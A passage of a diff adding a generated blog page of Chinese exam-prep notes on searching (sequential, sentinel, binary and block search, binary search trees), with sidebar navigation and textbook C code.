return true; } bool GetTop(SqStack &amp;amp;amp;S, Elemtype &amp;amp;amp;e) { if (S.top == -1) { //栈为空，无法读取 return false; } e = S.data[S.top]; return true; } 2. top 表示“下一个可存放元素的位置” 注意一开始 top 指针置为 0
+">数据结构之栈、队列和数组</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A1%A8/" class="article-link" data-summary="数据结构之绪论与线性表 第二章_线性表 2.1 线性表的定义和基本操作 2.1.1 线性表的定义 线性表是由n(n&amp;amp;gt;=0)个相同数据类型的元素组成的有限序列（数据类型相同，有限，有序）
+本小节介绍的线性表是一种逻辑结构，在线性表的重要术语中需要特别注意位序这一概念与数组下标的不同之处：位序是线性表中元素的逻辑位置（从 1 开始编号），数组下标是存储结构中的物理索引（通常从 0 开始），只有在线性表采用数组实现时，二者才满足位序 = 下标 &#43; 1。
+2.1.2 线性表的基本操作 线性表的基本操作，本质上就是数据结构三要素中“数据的运算”的具体体现。由于大多数高校采用严蔚敏版教材，这里介绍的函数名也采用这版的：
+InitList(&amp;amp;amp;L)：初始化表。构造一个空的线性表 L，并分配内存空间。 DestroyList(&amp;amp;amp;L)：销毁操作。销毁线性表，并释放线性表 L 所占用的内存空间。 ListInsert(&amp;amp;amp;L, i, e)：插入操作。在表 L 中的第 i 个位置上插入指定元素 e。 ListDelete(&amp;amp;amp;L, i, &amp;amp;amp;e)：删除操作。删除表 L 中第 i 个位置的元素，并用 e 返回删除的元素值。 LocateElem(L, e)：按值查找操作。在表 L 中查找具有给定关键字值的元素。 GetElem(L, i)：按位查找操作。获取表 L 中第 i 个位置的元素的值。 Length(L)：求表长。返回线性表 L 的长度，即 L 中数据元素的个数。 PrintList(L)：输出操作。按前后顺序输出线性表 L 的所有元素值。 Empty(L)：判空操作。若 L 为空表，则返回 true，否则返回 false。 2.2 顺序表 本小节思维导图如下： 2.2.1 顺序表的定义 线性表的顺序存储也称顺序表。它是用一段地址连续的存储单元依次存储线性表中的数据元素，使得逻辑上相邻的元素在物理位置上也相邻。顺序表的逻辑顺序和存储顺序完全一致
+">数据结构之线性表</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BB%AA%E8%AE%BA/" class="article-link" data-summary="数据结构之绪论 第一章_绪论 1.1 数据结构在学什么 如何用程序代码把现实世界的问题信息化 如何用计算机高效地处理这些信息从而创造价值 只有详细学习过这四门课的人才能够更好理解信息化，这也是计算机专业的学生和只会写代码的人的区别所在 1.2 数据结构的基本概念 本小节会对数据结构中的基本概念做简单讲解，目的在于了解和理解概念，具体的深入了解会在后面的章节中提到，本小节的思维导图如下： 1.2.1 基本概念 1.2.1.1 数据 数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合，数据是计算机程序加工的原料。
+简单来看，在计算机的世界中，数据就是0和1
+1.2.1.2 数据元素、数据项 数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，数据项是构成数据元素的不可分割的最小单位
+其实什么是数据元素什么是数据项，得根据实际的业务需求来确定，比如以微博举例：每一个账号为一个数据元素，而账号里的每一个信息为一个数据项： 1.2.1.3 数据结构、数据对象 数据结构是相互之间存在一种或者多种特定关系的数据元素的集合，数据对象是具有相同性质的数据元素的集合。
+其实简单理解就是数据对象是一堆相同性质的数据集合，而数据结构是在数据对象的基础上，还规定了数据结构的三要素&amp;amp;ndash;逻辑关系，存储结构，数据的运算。
+1.2.1.4 数据类型、抽象数据类型 数据类型是一个值的集合和定义在此集合上的一组操作的总称。分为原子类型（其值不可再分的数据类型）和结构类型（其值可以分解成若干成分的数据类型）
+抽象数据类型(Abstract Data Type,ADT) 是抽象数据组织及与之相关的操作
+若从数据结构的三要素来进行讨论，数据类型和抽象数据类型都只是实现了逻辑结构和数据的运算，不涉及具体的存储结构和实现细节。
+1.2.2 数据结构三要素 非常重要，我们再数据结构的学习中，任何涉及到数据结构的地方，首先想到的就应该是三要素
+1.2.2.1 逻辑结构 数据的逻辑结构只分为以下的四种结构，在考研数据结构中主要是讨论后三种逻辑结构：
+集合：各个数据元素同属一个集合，之间没有任何关系。 线性结构：数据元素之间是一对一的关系，除了第一个元素，所有的元素都有唯一前驱，除了最后一个元素，任何元素都有唯一后继 树形结构，就像树枝一样，数据元素之间是一对多的关系，比如本小节开始给的思维导图就是树形结构的关系 图结构：数据元素之间存在多对多的关系，像一张网一样。 1.2.2.2 存储结构（物理结构） 数据的存储结构（物理结构）是指数据在计算机内存中的存储方式，常见有以下四种：
+顺序存储：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现，要求给数据元素分配的是一片连续的内存空间，就像C语言中的数组。 链式存储：逻辑上相邻的元素可能在物理位置上表示不相邻，借助指示元素存储地址的指针来表示元素间的逻辑地址关系，就像C语言中的链表。 索引存储：在存储元素信息的同时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是（关键字，地址）。就像操作系统中分页存储中的页表。 散列存储：根据元素的关键字通过散列函数直接计算出元素的存储地址，又称哈希(Hash)存储。具体比较复杂，后面在做讲解，这里了解就好。 1.2.2.3 数据的运算 数据的运算是施加在数据上的运算，包括运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤。
+主要就是数据结构的创销，增删改查。
+数据的运算（“能对数据做什么”） │ ├── 运算的定义（面向逻辑结构） │ ├── 插入 │ ├── 删除 │ ├── 查找 │ ├── 修改 │ └── 遍历 │ └── 运算的实现（面向存储结构） ├── 顺序存储：移动元素 / 下标访问 ├── 链式存储：修改指针 ├── 索引存储：先查索引再访问数据 └── 散列存储：通过散列函数定位 1.3 算法的基本概念 算法（Algorithm）是对特定问题求解步骤的描述，是一个有穷的指令序列，其中每条指令表示一个或者多个操作。
+">数据结构之绪论</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>计算机网络</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+  
+</div>
+  <div class="content-center">
+    <article class="markdown-body">
+      <h1 class="post-title-template">数据结构之查找</h1>
+      <div class="post-date" style="margin-bottom: 20px; color: var(--text-color); opacity: 0.7; font-size: 0.9em;">
+        
+        
+            2026-03-02
+        
+      </div>
+      <h1 id="数据结构之查找">数据结构之查找</h1>
+<h1 id="第七章_查找">第七章_查找</h1>
+<h2 id="71-查找的基本概念">7.1 查找的基本概念</h2>
+<ul>
+<li>查找：在数据集合中寻找满足某种条件的数据元素的过程称为查找</li>
+<li>查找表（查找结构）：用于查找的数据集合称为查找表，它由同一类型的数据元素（或记录）组成，<strong>不一定只用于查找</strong>，还可用于增加/删除等操作。查找表并不是一个单一的数据结构，可以是图、树、线性表&hellip;</li>
+<li>关键字：数据元素中<strong>唯一</strong>标识该元素的某个数据项的值，使用基于关键字的查找，查找结果应该是唯一的。</li>
+<li><strong>静态查找表：</strong> 查找表在使用期间数据元素固定不变，仅支持查找操作，不进行频繁的插入或删除。</li>
+<li><strong>动态查找表：</strong> 查找表在使用期间数据元素可以动态增加或删除，支持查找、插入和删除等操作。</li>
+<li><strong>查找长度：</strong> 在查找运算中，需要对比关键字的次数称为查找长度</li>
+<li><strong>平均查找长度（ASL, Average Search Length）：</strong> 所有查找过程中进行关键字的比较次数的平均值，ASL 是<strong>各元素查找长度与其被查找概率（默认各元素相同）的加权平均值</strong>，其数学定义为：
+<strong>$$
+\text{ASL} = \sum_{i=1}^{n} L_i \cdot p_i
+$$</strong>
+默认情况为：
+<strong>$$
+\text{ASL} = \frac{1}{n} \sum_{i=1}^{n} L_i
+$$</strong>
+查找表中有 n 个元素，第 i 个元素查找长度为 L<sub>i</sub> ，查找概率为 P<sub>i</sub>（各元素之和为 1），<strong>ASL 是衡量查找算法效率的核心指标</strong>。</li>
+</ul>
+<h2 id="72-线性表查找">7.2 线性表查找</h2>
+<p>线性表查找指 “查找表” 是线性表的查找。</p>
+<h3 id="721-顺序查找">7.2.1 顺序查找</h3>
+<p>所谓顺序查找，就是我们最熟悉的从头到尾去挨个匹配关键字。</p>
+<h4 id="7211-一般顺序查找">7.2.1.1 一般顺序查找</h4>
+<p>普通顺序查找的实现方式很简单，代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ElemType</span> <span class="o">*</span><span class="n">elem</span><span class="p">;</span> <span class="c1">//这里可以用动态数组的方式实现，省略了一些代码
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">TableLen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">SSTable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//顺序查找
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">Search_Seq</span><span class="p">(</span><span class="n">SSTable</span> <span class="n">ST</span><span class="p">,</span><span class="n">ElemType</span> <span class="n">key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ST</span><span class="p">.</span><span class="n">TableLen</span> <span class="o">&amp;&amp;</span> <span class="n">ST</span><span class="p">.</span><span class="n">elem</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">!=</span><span class="n">key</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">);</span> <span class="c1">//判断是否越界，判断是否查找成功
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//查找成功，则返回元素下标；查找失败，则返回-1
+</span></span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">i</span><span class="o">==</span><span class="n">ST</span><span class="p">.</span><span class="n">TableLen</span><span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="7212-哨兵模式顺序查找">7.2.1.2 哨兵模式顺序查找</h4>
+<p>我们将待查找的关键字放在数组下标为 0 的位置，数据从下标为 1 的位置开始存储，从后往前顺序查找。这样便不用每次都判断是否越界，因为遍历到下标为 0 的位置会自动停下来。我们将下标为 0 位置对应元素称之为<strong>哨兵</strong>，实现代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ElemType</span> <span class="o">*</span><span class="n">elem</span><span class="p">;</span>  <span class="c1">//这里可以用动态数组的方式实现，省略了一些代码
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">TableLen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">SSTable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//顺序查找（哨兵优化版）
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">Search_Seq</span><span class="p">(</span><span class="n">SSTable</span> <span class="n">ST</span><span class="p">,</span> <span class="n">ElemType</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ST</span><span class="p">.</span><span class="n">elem</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>  <span class="c1">// &#34;哨兵&#34;
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">ST</span><span class="p">.</span><span class="n">TableLen</span><span class="p">;</span> <span class="n">ST</span><span class="p">.</span><span class="n">elem</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">key</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span><span class="p">);</span>  <span class="c1">// 从后往前找
+</span></span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">i</span><span class="p">;</span>  <span class="c1">// 查找成功，则返回元素下标；查找失败，则返回0
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>实际上，哨兵模式只是对顺序查找的代码结构进行了优化，减少了边界判断的次数，但在最坏、平均以及最好情况下，其时间复杂度与普通顺序查找并无本质区别，均为 <strong>O(n)</strong>。其查找效率（<strong>ASL 与一般顺序查找一样</strong>）分析如下图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20260225114523224.png" alt="哨兵模式查找效率分析"></p>
+<h4 id="7213-有序线性表顺序查找">7.2.1.3 有序线性表顺序查找</h4>
+<p>对于有序线性表，可以在查找过程中通过比较关键字的大小关系，一旦发现不可能再出现匹配元素，即可判定查找失败或成功。代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ElemType</span> <span class="o">*</span><span class="n">elem</span><span class="p">;</span>   <span class="c1">// 动态数组
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">TableLen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SSTable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 有序顺序查找（升序）
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">Search_Seq_Ordered</span><span class="p">(</span><span class="n">SSTable</span> <span class="n">ST</span><span class="p">,</span> <span class="n">ElemType</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 只要当前元素 &lt;= key，就还有继续查找的必要
+</span></span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">ST</span><span class="p">.</span><span class="n">TableLen</span> <span class="o">&amp;&amp;</span> <span class="n">ST</span><span class="p">.</span><span class="n">elem</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 判断是否查找成功
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">ST</span><span class="p">.</span><span class="n">TableLen</span> <span class="o">&amp;&amp;</span> <span class="n">ST</span><span class="p">.</span><span class="n">elem</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">i</span><span class="p">;</span>      <span class="c1">// 查找成功
+</span></span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>     <span class="c1">// 查找失败
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>值得注意的是，对于求取<strong>有序线性表的 ASL</strong> 我们一定要学会画<strong>查找判定树</strong>，示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260225121602831.png" alt="查找判定树"></p>
+<h4 id="7214-查找概率不相等的顺序查找">7.2.1.4 查找概率不相等的顺序查找</h4>
+<p>对于查找概率不相等的顺序查找，我们可以将概率较大的元素放在前面，这样优化了 <strong>ASL<sub>成功</sub></strong> ，但是对于本来有序的线性表，将其打乱了顺序，其 <strong>ASL<sub>失败</sub></strong> 又回到了一般顺序查找的 n + 1 。示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260225125819464.png" alt="概率不相同"></p>
+<h3 id="722-折半查找">7.2.2 折半查找</h3>
+<h4 id="7221-折半查找实现">7.2.2.1 折半查找实现</h4>
+<p>折半查找也叫做二分查找，只适用于<strong>有序</strong>的<strong>顺序表</strong>。
+折半查找的概念很简单，我就不多做赘述了，看代码也能看懂。值得注意的是它<strong>查找失败的判定条件是 high &lt; low</strong>，第一次接触可能难懂，找个例子推导一下就清晰了。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ElemType</span> <span class="o">*</span><span class="n">elem</span><span class="p">;</span>  <span class="c1">// 动态数组基址
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">TableLen</span><span class="p">;</span>    <span class="c1">// 表的长度
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">SSTable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 折半查找（仅适用于有序的顺序表）
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">Binary_Search</span><span class="p">(</span><span class="n">SSTable</span> <span class="n">L</span><span class="p">,</span> <span class="n">ElemType</span> <span class="n">key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">low</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">high</span><span class="o">=</span><span class="n">L</span><span class="p">.</span><span class="n">TableLen</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">mid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">low</span><span class="o">&lt;=</span><span class="n">high</span><span class="p">){</span>  <span class="c1">//看过来！！ 这个边界条件推一推就知道是怎么回事了！
+</span></span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">low</span><span class="o">+</span><span class="n">high</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>  <span class="c1">// 要的就是这个向下取整哦(你非要向上取整也行)
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">L</span><span class="p">.</span><span class="n">elem</span><span class="p">[</span><span class="n">mid</span><span class="p">]</span><span class="o">==</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">mid</span><span class="p">;</span>     <span class="c1">// 查找成功则返回所在位置
+</span></span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">L</span><span class="p">.</span><span class="n">elem</span><span class="p">[</span><span class="n">mid</span><span class="p">]</span><span class="o">&gt;</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">high</span><span class="o">=</span><span class="n">mid</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>     <span class="c1">// 从前半部分继续查找
+</span></span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="n">low</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>      <span class="c1">// 从后半部分继续查找
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>  <span class="c1">// 查找失败，返回-1
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>时间复杂度为 <strong>log<sub>2</sub>n</strong>，效率显著高于顺序查找。</p>
+<h4 id="7222-折半查找性质">7.2.2.2 折半查找性质</h4>
+<p>对于折半查找判定树有这些<strong>性质</strong>：</p>
+<ol>
+<li><strong>折半查找判定树一定是平衡二叉树，但可不是二叉排序树</strong>。</li>
+<li><strong>n 个成功结点一定有 n + 1 个失败结点（这也是所有判定树的性质，也与线索二叉树相关）</strong>。</li>
+<li>具有 n 个成功结点的查找判定数高度为 <strong>log<sub>2</sub>(n + 1)</strong>（二叉树的性质）</li>
+</ol>
+<h4 id="7223-折半查找判定树">7.2.2.3 折半查找判定树</h4>
+<p>对于查找有序的查找表，一定要学会画它的<strong>查找判定树</strong>用来找它的 <strong>ASL</strong>，折半查找的查找判定树示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260225144738822.png" alt="折半查找判定树"></p>
+<h3 id="723-分块查找">7.2.3 分块查找</h3>
+<h4 id="7231-分块查找的概念">7.2.3.1 分块查找的概念</h4>
+<p>分块查找又称<strong>索引顺序查找</strong>，它结合了顺序查找以及折半查找各自的优点。
+分块查找的<strong>基本思想</strong>是：将查找表分为若干子块。<strong>块内元素可以无序，块间元素必须有序</strong>。同时建立一个索引表，其中每个元素包含<strong>对应块的最大关键字和该块的起始地址</strong>，索引表按最大关键字有序排列。查找时先通过索引表确定待查关键字所在的块，再在块内进行顺序查找。
+示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260225201311257.png" alt="分块查找的概念"></p>
+<h4 id="7232-分块查找的使用">7.2.3.2 分块查找的使用</h4>
+<p>由于在考研中分块查找的代码实现基本不考，所以这里仅介绍分块查找过程。
+显而易见，对于<strong>索引表</strong>我们可以使用<strong>二分查找和顺序查找</strong>，对于<strong>块内元素（无序）</strong>，我们只能使用<strong>顺序查找</strong>。</p>
+<p>那么较难理解的就是如何对索引表使用二分查找以确定下一步在哪个块内查询？其实很简单，无论什么情况 <strong>low 指针所指向的索引项对应的块包含下一步可能进行顺序查找的元素。</strong> 如果指向超出索引表范围，就说明<strong>查找失败</strong>。示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260225211605885.png" alt="索引表二分查找"></p>
+<h4 id="7234-分块查找求-asl">7.2.3.4 分块查找求 ASL</h4>
+<p>对于 <strong>ASL<sub>失败</sub></strong> 这种情况，很复杂，考研也不考，就不介绍了。
+对于 <strong>ASL<sub>成功</sub></strong> 这种情况，索引表使用顺序查找我们可以很轻松的算到每个元素的查找长度；而索引表使用二分查找，我们利用二分查找判定树，也能很轻松的求出每个元素的查找长度。但是对于<strong>平均查找长度（ASL)</strong>，需要求取每个元素的查找长度，貌似两种情况都有些计算量太大了，没办法只能算（考研可能会给些计算量小的）。
+示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260225213612263.png" alt="分块查找求 ASL">
+那么分块查找的 ASL 在<strong>平均意义</strong>（各块中元素被查找的概率相同或者块大小相同、关键字分布均匀）下还有一个性质：
+<strong>分块查找的 ASL = 索引查找的 ASL + 块内查找的 ASL</strong>
+示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260225220145990.png" alt="分块查找性质"></p>
+<h2 id="73-树形查找">7.3 树形查找</h2>
+<h3 id="731-二叉排序树">7.3.1 二叉排序树</h3>
+<h4 id="7311-二叉排序树的概念">7.3.1.1 二叉排序树的概念</h4>
+<p>二叉排序树（<strong>BST</strong>）又称为<strong>二叉查找树</strong>，具有<strong>左子树结点值 &lt; 根结点值 &lt; 右子树结点值</strong>，显然，对二叉排序树使用中序遍历就能得到一个有序的序列。示意图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260216174722558.png" alt="二叉排序树"></p>
+<h4 id="7312-二叉排序树的查找">7.3.1.2 二叉排序树的查找</h4>
+<p>对二叉排序树进行结点的<strong>查找</strong>也是非常简单的，两种实现代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//在二叉排序树中查找值为 key 的结点（最坏空间复杂度 O(1)）
+</span></span></span><span class="line"><span class="cl"><span class="n">BSTNode</span> <span class="o">*</span><span class="nf">BST_Search</span><span class="p">(</span><span class="n">BSTree</span> <span class="n">T</span><span class="p">,</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">T</span><span class="o">!=</span><span class="nb">NULL</span><span class="o">&amp;&amp;</span><span class="n">key</span><span class="o">!=</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">){</span>    <span class="c1">//若树空或等于根结点值，则结束循环
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">key</span><span class="o">&lt;</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">)</span> <span class="n">T</span><span class="o">=</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">lchild</span><span class="p">;</span>  <span class="c1">//小于，则在左子树上查找
+</span></span></span><span class="line"><span class="cl">        <span class="k">else</span>  <span class="n">T</span><span class="o">=</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">rchild</span><span class="p">;</span>           <span class="c1">//大于，则在右子树上查找
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">T</span><span class="p">;</span>  <span class="c1">//查找失败返回的就是 NULL
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//数据有递归的性质，自然也能用递归来进行实现
+</span></span></span><span class="line"><span class="cl"><span class="c1">//在二叉排序树中查找值为 key 的结点（递归实现，最坏空间复杂度O(h)，h是树的高度）
+</span></span></span><span class="line"><span class="cl"><span class="n">BSTNode</span> <span class="o">*</span><span class="nf">BSTSearch</span><span class="p">(</span><span class="n">BSTree</span> <span class="n">T</span><span class="p">,</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">T</span><span class="o">==</span><span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>    <span class="c1">//查找失败
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">key</span><span class="o">==</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">T</span><span class="p">;</span>       <span class="c1">//查找成功
+</span></span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">&lt;</span> <span class="n">T</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">BSTSearch</span><span class="p">(</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">lchild</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>  <span class="c1">//在左子树中找
+</span></span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">BSTSearch</span><span class="p">(</span><span class="n">T</span><span class="o">-&gt;</span><span class="n">rchild</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>  <span class="c1">//在右子树中找
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="7313-二叉排序树的插入">7.3.1.3 二叉排序树的插入</h4>
+<p>对排序二叉树的<strong>插入操作</strong>实现代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//在二叉排序树插入关键字为k的新结点（递归实现）
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">BST_Insert</span><span class="p">(</span><span class="n">BSTree</span> <span class="o">&amp;</span><span class="n">T</span><span class="p">,</span> <span class="kt">int</span> <span class="n">k</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">T</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>                      <span class="c1">//原树为空，新插入的结点为根结点
+</span></span></span><span class="line"><span class="cl">        <span class="n">T</span><span class="o">=</span><span class="p">(</span><span class="n">BSTree</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">BSTNode</span><span class="p">));</span>
